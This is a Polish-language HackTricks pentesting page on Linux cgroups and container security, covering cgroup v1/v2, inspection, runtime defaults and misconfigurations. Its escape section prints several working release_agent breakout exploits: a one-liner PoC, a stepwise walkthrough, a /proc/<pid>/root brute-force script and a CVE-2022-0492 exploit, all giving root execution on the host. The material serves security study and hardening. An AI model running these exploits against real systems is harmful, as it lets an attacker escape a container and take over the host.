# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

Linux **control groups** to mechanizm jądra służący do grupowania procesów w celu rozliczeń, ograniczeń, priorytetyzacji i egzekwowania polityk. Jeśli namespaces służą głównie do izolowania widoku zasobów, cgroups zajmują się przede wszystkim kontrolą **ile** tych zasobów zestaw procesów może zużyć i, w niektórych przypadkach, **którymi klasami zasobów** w ogóle mogą się posługiwać. Kontenery polegają na cgroups nieustannie, nawet jeśli użytkownik nigdy nie patrzy na nie bezpośrednio, ponieważ niemal każdy nowoczesny runtime potrzebuje sposobu, by powiedzieć jądru "te procesy należą do tego workloadu, a to są zasady zasobów, które się do nich odnoszą".

Dlatego silniki kontenerów umieszczają nowy kontener w jego własnym poddrzewie cgroup. Gdy drzewo procesów tam trafi, runtime może ograniczyć pamięć, limitować liczbę PID-ów, nadawać wagę użyciu CPU, regulować I/O i ograniczać dostęp do urządzeń. W środowisku produkcyjnym jest to niezbędne zarówno dla bezpieczeństwa multi-tenant, jak i dla prostej higieny operacyjnej. Kontener bez sensownych kontroli zasobów może wyczerpać pamięć, zalewić system procesami lub zmonopolizować CPU i I/O w sposób destabilizujący hosta lub sąsiednie workloady.

Z perspektywy bezpieczeństwa, cgroups mają znaczenie na dwa sposoby. Po pierwsze, złe lub brakujące limity zasobów umożliwiają proste ataki denial-of-service. Po drugie, niektóre funkcje cgroup, szczególnie w starszych konfiguracjach **cgroup v1**, historycznie tworzyły potężne prymitywy ucieczki, gdy były zapisywalne z wnętrza kontenera.

## v1 Vs v2

Na świecie występują dwa główne modele cgroup. **cgroup v1** udostępnia wiele hierarchii kontrolerów, a starsze opisy exploitów często krążą wokół dziwnej i czasem zbyt potężnej semantyki dostępnej tam. **cgroup v2** wprowadza bardziej zunifikowaną hierarchię i na ogół czyściejsze zachowanie. Nowoczesne dystrybucje coraz częściej preferują cgroup v2, ale wciąż istnieją środowiska mieszane lub legacy, co oznacza, że oba modele są nadal istotne przy przeglądzie rzeczywistych systemów.

Różnica ma znaczenie, ponieważ niektóre z najsłynniejszych historii o breakoutach z kontenerów, takie jak nadużycia `release_agent` w cgroup v1, są powiązane bardzo konkretnie ze starszym zachowaniem cgroup. Czytelnik, który zobaczy exploit cgroup na blogu i następnie ślepo zastosuje go do nowoczesnego systemu jedynie z cgroup v2, prawdopodobnie źle zinterpretuje, co jest faktycznie możliwe na celu.

## Inspekcja

Najszybszy sposób, by zobaczyć, gdzie znajduje się obecna powłoka, to:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Plik `/proc/self/cgroup` pokazuje ścieżki cgroup powiązane z aktualnym procesem. Na nowoczesnym hoście z cgroup v2 często zobaczysz zunifikowany wpis. Na starszych lub hybrydowych hostach możesz zobaczyć wiele ścieżek kontrolerów v1. Gdy znasz ścieżkę, możesz sprawdzić odpowiadające pliki w `/sys/fs/cgroup`, aby zobaczyć limity i bieżące użycie.

Na hoście z cgroup v2 następujące polecenia są przydatne:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Te pliki ujawniają, które controllers istnieją i które z nich są delegowane do child cgroups. Ten model delegowania ma znaczenie w środowiskach rootless i zarządzanych przez systemd, gdzie runtime może kontrolować jedynie podzbiór funkcjonalności cgroup, który hierarchia nadrzędna faktycznie deleguje.

## Laboratorium

Jednym ze sposobów obserwacji cgroups w praktyce jest uruchomienie containera z ograniczoną pamięcią:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Możesz też spróbować kontenera z ograniczeniem PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Te przykłady są przydatne, ponieważ pomagają powiązać flagę runtime z interfejsem plikowym jądra. Runtime nie egzekwuje reguły magicznie; zapisuje odpowiednie ustawienia cgroup, a następnie pozwala jądru egzekwować je wobec drzewa procesów.

## Użycie runtime

Docker, Podman, containerd i CRI-O polegają na cgroups w ramach normalnej pracy. Różnice zwykle nie dotyczą tego, czy używają cgroups, lecz **które domyślne ustawienia wybierają**, **jak wchodzą w interakcję z systemd**, **jak działa delegacja w trybie rootless**, oraz **ile konfiguracji jest kontrolowane na poziomie silnika w porównaniu z poziomem orkiestracji**.

W Kubernetes, resource requests i limits ostatecznie stają się konfiguracją cgroup na węźle. Ścieżka od Pod YAML do egzekwowania przez jądro przechodzi przez kubelet, CRI runtime i OCI runtime, ale cgroups pozostają mechanizmem jądra, który finalnie stosuje regułę. W środowiskach Incus/LXC cgroups są również szeroko używane, zwłaszcza ponieważ system containers często ujawniają bogatsze drzewo procesów i bardziej VM-podobne oczekiwania operacyjne.

## Błędne konfiguracje i ucieczki

Klasyczna historia bezpieczeństwa cgroup to zapisywalny mechanizm **cgroup v1 `release_agent`**. W tym modelu, jeśli atakujący mógł zapisać do odpowiednich plików cgroup, ustawić `notify_on_release`, i kontrolować ścieżkę zapisaną w `release_agent`, jądro mogło ostatecznie wykonać wybraną przez atakującego ścieżkę w initial namespaces na hoście, gdy cgroup stała się pusta. Dlatego starsze opracowania poświęcały tak dużą uwagę zapisywalności kontrolerów cgroup, opcjom montowania oraz warunkom namespace/capability.

Nawet gdy `release_agent` nie jest dostępny, błędy w konfiguracji cgroup wciąż mają znaczenie. Zbyt szeroki dostęp do urządzeń może sprawić, że urządzenia hosta będą osiągalne z kontenera. Brak limitów pamięci i PID może zamienić proste wykonanie kodu w DoS hosta. Słaba delegacja cgroup w scenariuszach rootless może też wprowadzać w błąd obrońców, skłaniając ich do założenia, że ograniczenie istnieje, podczas gdy runtime nigdy faktycznie nie był w stanie go zastosować.

### Tło `release_agent`

Technika `release_agent` dotyczy tylko **cgroup v1**. Podstawowa idea jest taka, że gdy ostatni proces w cgroup zakończy działanie i ustawione jest `notify_on_release=1`, jądro wykonuje program, którego ścieżka jest zapisana w `release_agent`. To wykonanie następuje w **initial namespaces on the host**, co sprawia, że zapisywalny `release_agent` staje się prymitywem do ucieczki z kontenera.

Aby technika zadziałała, atakujący zazwyczaj potrzebuje:

- zapisywalnej hierarchii **cgroup v1**
- możliwości utworzenia lub użycia podrzędnej cgroup
- możliwości ustawienia `notify_on_release`
- możliwości zapisania ścieżki do `release_agent`
- ścieżki, która z punktu widzenia hosta wskazuje na plik wykonywalny

### Klasyczny PoC

Historyczny jednolinijkowy PoC to:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Ten PoC zapisuje ścieżkę payloadu do `release_agent`, wyzwala cgroup release, a następnie odczytuje plik wyjściowy wygenerowany na hoście.

### Czytelny przewodnik krok po kroku

Ten sam pomysł łatwiej zrozumieć, gdy rozbijemy go na kroki.

1. Utwórz i przygotuj zapisywalny cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Zidentyfikuj ścieżkę na hoście odpowiadającą systemowi plików kontenera:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Drop a payload, który będzie widoczny z host path:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Wywołaj wykonanie, opróżniając cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Skutkiem jest wykonanie po stronie hosta payload z uprawnieniami root na hoście. W rzeczywistym exploicie payload zwykle zapisuje plik dowodowy, uruchamia reverse shell lub modyfikuje stan hosta.

### Wariant ścieżki względnej przy użyciu `/proc/<pid>/root`

W niektórych środowiskach ścieżka hosta do systemu plików kontenera nie jest oczywista lub jest ukryta przez storage driver. W takim przypadku ścieżka payload może być wyrażona przez `/proc/<pid>/root/...`, gdzie `<pid>` jest host PID należącym do procesu w bieżącym kontenerze. To jest podstawa wariantu brute-force opartego na ścieżkach względnych:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Kluczowy trik tutaj to nie samo brute force, lecz forma ścieżki: `/proc/<pid>/root/...` pozwala kernelowi rozwiązać plik w systemie plików kontenera z przestrzeni nazw hosta, nawet gdy bezpośrednia ścieżka do pamięci masowej hosta nie jest znana z góry.

### Wariant CVE-2022-0492

W 2022 roku CVE-2022-0492 pokazał, że zapis do `release_agent` w cgroup v1 nie sprawdzał poprawnie obecności `CAP_SYS_ADMIN` w **początkowej** przestrzeni nazw użytkownika. Sprawiło to, że technika stała się znacznie łatwiej osiągalna na podatnych jądrach, ponieważ proces w kontenerze, który mógł zamontować hierarchię cgroup, mógł zapisać do `release_agent` bez uprzedniego posiadania przywilejów w przestrzeni nazw użytkownika hosta.

Minimalny exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Na podatnym jądrze host wykonuje `/proc/self/exe` z host root privileges.

W praktyce zacznij od sprawdzenia, czy środowisko nadal udostępnia zapisywalne ścieżki cgroup-v1 lub niebezpieczny dostęp do urządzeń:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Jeśli `release_agent` jest obecny i zapisywalny, znajdujesz się już w obszarze legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Jeśli sama ścieżka cgroup nie daje możliwości ucieczki, następnym praktycznym zastosowaniem często jest denial of service lub reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Te polecenia szybko powiedzą ci, czy obciążenie ma możliwość przeprowadzenia fork-bomb, agresywnego zużycia pamięci lub nadużycia zapisywalnego, przestarzałego interfejsu cgroup.

## Sprawdzenia

Podczas analizy celu celem sprawdzeń cgroup jest ustalenie, który model cgroup jest używany, czy kontener widzi zapisywalne ścieżki kontrolerów oraz czy stare breakout primitives, takie jak `release_agent`, w ogóle mają znaczenie.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Co jest tutaj interesujące:

- Jeśli `mount | grep cgroup` pokazuje **cgroup v1**, starsze breakout writeups stają się bardziej istotne.
- Jeśli `release_agent` istnieje i jest osiągalny, warto to natychmiast dokładniej zbadać.
- Jeśli widoczna hierarchia cgroup jest zapisywalna, a kontener ma również silne capabilities, środowisko zasługuje na znacznie bliższy przegląd.

Jeśli odkryjesz **cgroup v1**, zapisywalne montowania kontrolerów oraz kontener, który ma też silne capabilities lub słabą ochronę seccomp/AppArmor, ta kombinacja wymaga uważnej analizy. cgroups często są traktowane jako nudny temat zarządzania zasobami, ale historycznie były częścią jednych z najbardziej pouczających container escape chains właśnie dlatego, że granica między "kontrolą zasobów" a "wpływem na hosta" nie zawsze była tak czysta, jak ludzie zakładali.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Typowe ręczne osłabianie |
| --- | --- | --- | --- |
| Docker Engine | Włączone domyślnie | Kontenery są automatycznie umieszczane w cgroups; limity zasobów są opcjonalne, chyba że ustawione za pomocą flag | pomijanie `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Włączone domyślnie | `--cgroups=enabled` jest domyślny; domyślne ustawienia namespace cgroup zależą od wersji cgroup (`private` na cgroup v2, `host` na niektórych konfiguracjach cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, złagodzony dostęp do urządzeń, `--privileged` |
| Kubernetes | Włączone przez runtime domyślnie | Pods i kontenery są umieszczane w cgroups przez runtime węzła; drobnoziarnista kontrola zasobów zależy od `resources.requests` / `resources.limits` | pomijanie resource requests/limits, uprzywilejowany dostęp do urządzeń, błędna konfiguracja runtime na poziomie hosta |
| containerd / CRI-O | Włączone domyślnie | cgroups są częścią normalnego zarządzania cyklem życia | bezpośrednie konfiguracje runtime, które poluzowują kontrolę nad urządzeniami lub ujawniają przestarzałe zapisywalne interfejsy cgroup v1 |

Ważne rozróżnienie jest takie, że **obecność cgroup** jest zazwyczaj domyślna, podczas gdy **użyteczne ograniczenia zasobów** często są opcjonalne, chyba że zostaną wyraźnie skonfigurowane.
{{#include ../../../../banners/hacktricks-training.md}}
